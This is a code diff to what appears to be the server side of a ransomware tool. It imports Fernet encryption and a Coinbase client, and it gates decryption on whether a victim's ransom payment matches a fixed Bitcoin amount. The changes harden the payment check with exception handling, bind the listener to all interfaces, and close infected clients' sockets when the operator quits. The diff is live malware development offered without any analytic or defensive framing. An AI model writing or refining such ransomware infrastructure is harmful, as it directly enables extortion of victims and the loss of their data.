@@ -6,7 +6,7 @@ from cryptography.fernet import Fernet
 import threading
 from coinbase.wallet.client import Client
 
-SERVER_ADDRESS = ('0.0.0.0', 17694)
+SERVER_ADDRESS = ('', 17694)
 client_list = []
 information_list = []
 with open("communication_encryption_key.txt", 'rb') as communication_key_file:
@@ -44,10 +44,13 @@ def check_payment(transaction_id):
     account_id = "*"
     my_address = "*"
     # ["to"]["address"]
-    client = Client(api_key, api_secret)
-    transaction = client.get_transaction(account_id, transaction_id)
-    can_decrypt = transaction["amount"]["amount"] == "-0.00041194" # and transaction["to"]["address"] == my_address
-    return can_decrypt
+    try:
+        client = Client(api_key, api_secret)
+        transaction = client.get_transaction(account_id, transaction_id)
+        can_decrypt = transaction["amount"]["amount"] == "-0.00041194"
+        return can_decrypt
+    except Exception as _:
+        return False
 
 
 class Communicate(threading.Thread):
@@ -111,6 +114,8 @@ class ControlPanel(threading.Thread):
                     for hostname, address in information_list:
                         print(f"{hostname}     |      {address}")
             elif command == "quit":
+                for open_socket in client_list:
+                    open_socket.close()
                 quit()
             elif command == "clear":
                 for i in range(100):
